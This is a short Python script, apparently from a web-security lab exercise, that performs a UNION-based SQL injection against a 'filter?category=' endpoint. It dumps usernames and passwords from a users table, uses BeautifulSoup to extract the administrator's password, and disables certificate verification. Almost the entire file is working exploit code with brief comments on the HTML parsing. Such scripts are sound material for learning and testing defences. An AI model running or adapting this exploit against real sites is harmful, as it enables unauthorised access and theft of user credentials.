import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}



def exploit_sqli_users(url):
    path = 'filter?category=Lifestyle'
    sql_payload = "' union select username, password from users--"
    r = requests.get(url + path + sql_payload, verify=False, proxies = proxies)
    res = r.text
    if 'administrator' in res:
        print('Found administrator password...')
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.body.find(text ='administrator').parent.findNext('td').contents[0]
        print(f'[+] The administrator password is {admin_password}')
        return True
    return False
#----------------
#Line 22 is saying: find string > find parent html element '<tr>' > find the next '<td>' element > display first element in content
#refer to res to see html structure
#----------------
    


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)

    print('[+] Dumping usernames and passwords...')
    if not exploit_sqli_users(url):
        print('[-] Did not find an admin password.')

